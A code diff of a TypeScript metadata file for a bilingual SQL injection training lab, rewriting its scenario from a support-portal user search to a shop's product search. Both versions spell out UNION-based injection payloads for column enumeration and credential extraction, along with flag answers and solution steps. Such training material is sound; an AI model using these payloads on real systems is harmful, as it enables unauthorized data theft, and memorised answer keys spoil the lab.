@@ -1,168 +1,149 @@
-// src/modules/practice-labs/sql-injection/labs/lab2/lab2.metadata.ts
 import type { LabMetadata } from '../../../types/lab-metadata.type';
 
 export const lab2Metadata: LabMetadata = {
-  slug: 'sqli-union-extraction',
+  slug: 'sqli-union-extract',
   title: 'SQL Injection: UNION-Based Data Extraction',
-  ar_title: 'حقن SQL: استخراج البيانات بـ UNION',
+  ar_title: 'حقن SQL: استخراج البيانات عبر UNION',
   description:
-    "You infiltrated CyberCorp's internal support portal. The user directory search is vulnerable to UNION-based SQLi. Extract the hidden admin credentials.",
+    'Use UNION-based SQL injection to extract sensitive data from a hidden database table through a product search endpoint.',
   ar_description:
-    'اخترقت بوابة الدعم الداخلية لـ CyberCorp. البحث عن المستخدمين يحتوي على ثغرة UNION SQLi. استخرج بيانات الأدمن المخفية.',
-  difficulty: 'INTERMEDIATE',
+    'استخدم حقن SQL القائم على UNION لاستخراج بيانات حساسة من جدول مخفي في قاعدة البيانات عبر نقطة نهاية البحث عن المنتجات.',
+  difficulty: 'BEGINNER',
   category: 'WEB_SECURITY',
-  skills: [
-    'SQL Injection',
-    'UNION Attack',
-    'Column Enumeration',
-    'Data Extraction',
-  ],
-  xpReward: 200,
-  pointsReward: 100,
-  duration: 45,
+  skills: ['SQL Injection', 'UNION Attack', 'Column Enumeration', 'Data Extraction'],
+  xpReward: 120,
+  pointsReward: 60,
+  duration: 35,
   executionMode: 'SHARED_BACKEND',
   isPublished: true,
+  environmentType: 'ECOMMERCE',
+  canonicalConceptId: 'sqli-union',
 
-  // ─── للمتدرب ────────────────────────────────────────────────────
-  goal: 'Use UNION-based SQL injection to extract the admin password from the user directory search.',
-  ar_goal:
-    'استخدم حقن SQL بأسلوب UNION لاستخراج كلمة مرور المدير من خاصية البحث في دليل المستخدمين.',
+  goal: 'Extract admin credentials from the hidden `secrets` table using UNION injection.',
+  ar_goal: 'استخرج بيانات اعتماد الأدمن من جدول `secrets` المخفي باستخدام حقن UNION.',
+
+  missionBrief: {
+    codename: 'UNION STRIKE',
+    classification: 'SECRET',
+    objective: 'The ShopX product search endpoint reflects unsanitized input into a raw SQL query. Use UNION injection to pivot into a hidden secrets table and retrieve the admin credential stored there.',
+    ar_objective: 'نقطة نهاية البحث عن المنتجات في ShopX تعكس المدخلات غير المعقّمة في استعلام SQL خام. استخدم حقن UNION للانتقال إلى جدول secrets مخفي واسترداد بيانات الاعتماد المخزّنة فيه.',
+    background: 'ShopX is a mid-sized e-commerce platform. The search bar passes the query parameter directly into a SELECT statement with no parameterization.',
+    successCriteria: [
+      'Determine the number of columns in the original query',
+      'Find which column is text-renderable',
+      'Inject UNION SELECT to pull data from the secrets table',
+      'Retrieve the flag',
+    ],
+  },
+
+  labInfo: {
+    vulnType: 'UNION-Based SQL Injection',
+    ar_vulnType: 'حقن SQL القائم على UNION',
+    cweId: 'CWE-89',
+    cvssScore: 9.1,
+    description: 'UNION injection appends a second SELECT statement to the original query, allowing the attacker to retrieve data from arbitrary tables. Requires matching column count and compatible data types.',
+    ar_description: 'يُضيف حقن UNION جملة SELECT ثانية للاستعلام الأصلي، مما يسمح للمهاجم باسترداد البيانات من أي جدول. يتطلب تطابق عدد الأعمدة وأنواع البيانات المتوافقة.',
+    whatYouLearn: [
+      'How to enumerate column count using ORDER BY',
+      'How to identify string-renderable columns with NULL payloads',
+      'How to extract data from arbitrary tables using UNION SELECT',
+    ],
+    techStack: ['Node.js', 'PostgreSQL', 'Raw SQL'],
+    references: [
+      { label: 'PortSwigger: UNION attacks', url: 'https://portswigger.net/web-security/sql-injection/union-attacks' },
+    ],
+  },
 
   briefing: {
-    en: `CyberCorp — a mid-size tech company — runs an internal support portal for its 500+ employees.
-The portal has a "User Directory" feature that lets support agents search for colleagues by name.
-You have a low-privilege support account. The search box returns usernames, emails, and roles.
-You notice the password column is never shown in results... but is it truly out of reach?
-The database has it. The query touches it. The question is whether you can redirect it.`,
-    ar: `CyberCorp — شركة تقنية متوسطة الحجم — تشغّل بوابة دعم داخلية لأكثر من 500 موظف.
-تمتلك البوابة ميزة "دليل المستخدمين" تسمح لوكلاء الدعم بالبحث عن الزملاء بالاسم.
-لديك حساب دعم منخفض الصلاحيات. مربع البحث يُرجع أسماء المستخدمين والإيميلات والأدوار.
-تلاحظ أن عمود كلمة المرور لا يظهر أبداً في النتائج... لكن هل هو بعيد المنال فعلاً؟
-قاعدة البيانات تحتويه. الاستعلام يلمسه. السؤال هو هل يمكنك إعادة توجيهه.`,
+    en: `ShopX just launched a search feature. Customers can search for products by name.
+You noticed the URL looks like: /search?q=laptop
+The results change with your input. What if the input goes directly into the query?
+Time to find out what else lives in this database.`,
+    ar: `أطلقت ShopX ميزة بحث جديدة. يمكن للعملاء البحث عن المنتجات بالاسم.
+لاحظت أن الـ URL يبدو كالتالي: /search?q=laptop
+النتائج تتغير بمدخلاتك. ماذا لو ذهب المدخل مباشرة إلى الاستعلام؟
+حان الوقت لاكتشاف ما يوجد في قاعدة البيانات.`,
   },
 
   stepsOverview: {
     en: [
-      'Use the search normally — understand the structure of returned data (how many columns, what types)',
-      'Test the search parameter for SQL injection — probe the column count',
-      'Verify data type compatibility to prepare your UNION payload',
-      'Extract the hidden admin password by pivoting it into a visible column',
+      'Column count — use ORDER BY 1,2,3... until error to find column count',
+      'String column — inject UNION SELECT NULL,NULL,... replacing NULLs with strings',
+      'Extract — UNION SELECT null,secret_value,null FROM secrets WHERE id=1',
     ],
     ar: [
-      'استخدم البحث بشكل طبيعي — افهم بنية البيانات المُرجعة (كم عمود، ما الأنواع)',
-      'اختبر معامل البحث للحقن — استكشف عدد الأعمدة',
-      'تحقق من توافق أنواع البيانات لتحضير payload الـ UNION',
-      'استخرج كلمة مرور المدير المخفية بتحويلها لعمود مرئي',
+      'عدد الأعمدة — استخدم ORDER BY 1,2,3... حتى الخطأ لمعرفة عدد الأعمدة',
+      'عمود النص — احقن UNION SELECT NULL,NULL,... باستبدال NULLs بنصوص',
+      'استخراج — UNION SELECT null,secret_value,null FROM secrets WHERE id=1',
     ],
   },
 
-  // ─── للأدمن فقط ─────────────────────────────────────────────────
   solution: {
-    context:
-      "CyberCorp's internal support portal has a 'User Directory' search. The backend builds a raw SQL query selecting only username, email, and role. The admin password is never shown in normal results — retrievable only via UNION injection.",
-    vulnerableCode:
-      'SELECT username, email, role FROM "LabGenericUser"\n' +
-      "WHERE userId='...' AND labId='...' AND username ILIKE '%SEARCH_TERM%'",
-    exploitation:
-      "Step 1 — Confirm column count: ' ORDER BY 3--\n" +
-      "Step 2 — Type compat: ' UNION SELECT NULL,NULL,NULL--\n" +
-      'Step 3 — Extract password into email position:\n' +
-      "  ' UNION SELECT username, password, role FROM \"LabGenericUser\" WHERE username='admin'--",
+    context: 'Product search query: SELECT id, name, price FROM products WHERE name LIKE \'%$input%\'',
+    vulnerableCode: "SELECT id, name, price FROM products WHERE name LIKE '%$query%'",
+    exploitation: "Step 1: ' ORDER BY 3-- → no error (3 columns). Step 2: ' UNION SELECT NULL,'test',NULL-- → string in col 2. Step 3: ' UNION SELECT NULL,secret_value,NULL FROM secrets WHERE id=1--",
     steps: {
       en: [
-        "Search for 'alice' normally — observe: 3 columns returned (username, email, role)",
-        "Inject: ' ORDER BY 3-- → works normally. Try ' ORDER BY 4-- → error. Confirms 3 columns.",
-        "Inject: ' UNION SELECT NULL,NULL,NULL-- → if no error, types are compatible",
-        "Inject: ' UNION SELECT NULL,'test',NULL-- → 'test' appears in email column = column 2 is a string",
-        "Final payload: ' UNION SELECT username, password, role FROM \"LabGenericUser\" WHERE username='admin'-- → admin password appears in the email column",
+        "Test injection point: search for laptop' and observe error",
+        'Enumerate columns: ORDER BY 1--, ORDER BY 2--, ORDER BY 3--, ORDER BY 4-- (error = 3 columns)',
+        "Find string column: ' UNION SELECT NULL,'test',NULL--",
+        "Extract data: ' UNION SELECT NULL,secret_value,NULL FROM secrets WHERE id=1--",
+        'The flag appears in the results',
       ],
       ar: [
-        "ابحث عن 'alice' بشكل طبيعي — لاحظ: 3 أعمدة مُرجعة (username, email, role)",
-        "احقن: ' ORDER BY 3-- → يعمل بشكل طبيعي. جرّب ' ORDER BY 4-- → خطأ. يؤكد وجود 3 أعمدة.",
-        "احقن: ' UNION SELECT NULL,NULL,NULL-- → إن لم يكن هناك خطأ، الأنواع متوافقة",
-        "احقن: ' UNION SELECT NULL,'test',NULL-- → تظهر 'test' في عمود الإيميل = العمود 2 نص",
-        "الـ payload النهائي: ' UNION SELECT username, password, role FROM \"LabGenericUser\" WHERE username='admin'-- → كلمة مرور الأدمن تظهر في عمود الإيميل",
+        "اختبر نقطة الحقن: ابحث عن laptop' ولاحظ الخطأ",
+        'عدّد الأعمدة: ORDER BY 1--, 2--, 3--, 4-- (الخطأ يعني 3 أعمدة)',
+        "ابحث عن عمود النص: ' UNION SELECT NULL,'test',NULL--",
+        "استخرج البيانات: ' UNION SELECT NULL,secret_value,NULL FROM secrets WHERE id=1--",
+        'العلم يظهر في النتائج',
       ],
     },
     fix: [
-      'Use parameterized queries for all search inputs',
-      'Never expose password columns in any query, even if filtered in the application layer',
-      'Apply column whitelisting — only select exactly what you need',
-      'Use ORM to prevent raw query construction from user input',
+      'Use parameterized queries: SELECT id, name, price FROM products WHERE name LIKE $1',
+      'Whitelist allowed characters in search input',
+      'Implement query result limits',
     ],
   },
 
   postSolve: {
     explanation: {
-      en: 'UNION-based SQL injection allows an attacker to append an additional SELECT statement to the original query. By matching column count and types, the attacker can extract data from any table in the database, even columns not intended to be shown.',
-      ar: 'حقن SQL بأسلوب UNION يسمح للمهاجم بإضافة جملة SELECT إضافية للاستعلام الأصلي. بمطابقة عدد الأعمدة وأنواعها، يمكن للمهاجم استخراج بيانات من أي جدول في قاعدة البيانات، حتى الأعمدة غير المقصود عرضها.',
+      en: 'UNION-based injection requires matching the number of columns and finding at least one string-compatible column. Once achieved, the attacker can SELECT from any table in the database.',
+      ar: 'يتطلب حقن UNION تطابق عدد الأعمدة وإيجاد عمود واحد على الأقل متوافق مع النصوص. بمجرد تحقيق ذلك، يمكن للمهاجم SELECT من أي جدول في قاعدة البيانات.',
     },
     impact: {
-      en: 'Full database exfiltration. All user credentials, private data, and sensitive records become accessible to an attacker with any level of access to the search feature.',
-      ar: 'استخراج كامل لقاعدة البيانات. جميع بيانات اعتماد المستخدمين والبيانات الخاصة والسجلات الحساسة تصبح في متناول مهاجم لديه أي مستوى وصول لخاصية البحث.',
+      en: 'Complete database read access. All tables, all data — credentials, PII, financial records.',
+      ar: 'وصول قراءة كامل لقاعدة البيانات. جميع الجداول وجميع البيانات — بيانات الاعتماد والمعلومات الشخصية والسجلات المالية.',
     },
-    fix: [
-      'Always use prepared statements or ORM',
-      'Principle of least privilege: DB user should only SELECT needed columns',
-      'Never store plaintext passwords — use bcrypt with proper salt rounds',
-      'Monitor for UNION/ORDER BY patterns in query logs',
-    ],
+    fix: ['Parameterized queries', 'ORM usage', 'Principle of least privilege on DB user'],
   },
 
   hints: [
     {
       order: 1,
       xpCost: 10,
-      content:
-        "The query selects 3 columns. Confirm with: ' ORDER BY 3--  (works) vs ' ORDER BY 4-- (error)",
+      content: "First, confirm the injection point. Search for: laptop' -- \nIf you get an error or empty results, the input is reflected into SQL. Now count columns: try ORDER BY 1--, ORDER BY 2--, ORDER BY 3-- until you get an error. The last working number = column count.",
     },
     {
       order: 2,
       xpCost: 20,
-      content:
-        "Verify column types are compatible using NULLs: ' UNION SELECT NULL,NULL,NULL--",
+      content: "You have 3 columns. Now find which one is text-renderable.\nTry: ' UNION SELECT NULL,NULL,NULL--\nThen replace one NULL at a time with 'test': ' UNION SELECT NULL,'test',NULL--\nWhen 'test' appears in the results, that's your string column.",
     },
     {
       order: 3,
       xpCost: 30,
-      content:
-        "The 'password' column isn't in the original SELECT. You need to pivot it — inject it into the position of a visible column like email.",
+      content: "String column is column 2. Now extract from the secrets table:\n' UNION SELECT NULL,secret_value,NULL FROM secrets WHERE id=1--\n\nThis injects a second SELECT that reads from the secrets table and returns it in the name column of your results.",
     },
   ],
 
-  flagAnswer: 'FLAG{SQLI_UNION_DATA_EXTRACTED}',
+  flagAnswer: 'FLAG{SQLI_UNION_EXTRACT_SUCCESS}',
   initialState: {
-    users: [
-      {
-        username: 'alice',
-        email: 'alice@cybercorp.io',
-        role: 'analyst',
-        password: 'alice_cc1_pass',
-      },
-      {
-        username: 'bob',
-        email: 'bob@cybercorp.io',
-        role: 'analyst',
-        password: 'bob_cc2_pass',
-      },
-      {
-        username: 'charlie',
-        email: 'charlie@cybercorp.io',
-        role: 'analyst',
-        password: 'charlie_cc3',
-      },
-      {
-        username: 'support',
-        email: 'support@cybercorp.io',
-        role: 'support',
-        password: 'sup_cc4_pass',
-      },
-      {
-        username: 'admin',
-        email: 'admin@cybercorp.io',
-        role: 'admin',
-        password: 'FLAG{SQLI_UNION_DATA_EXTRACTED}',
-      },
+    products: [
+      { id: 1, name: 'Laptop Pro', price: 999 },
+      { id: 2, name: 'Wireless Mouse', price: 29 },
+      { id: 3, name: 'Mechanical Keyboard', price: 89 },
+    ],
+    secrets: [
+      { id: 1, secret_value: 'FLAG{SQLI_UNION_EXTRACT_SUCCESS}' },
     ],
   },
 };
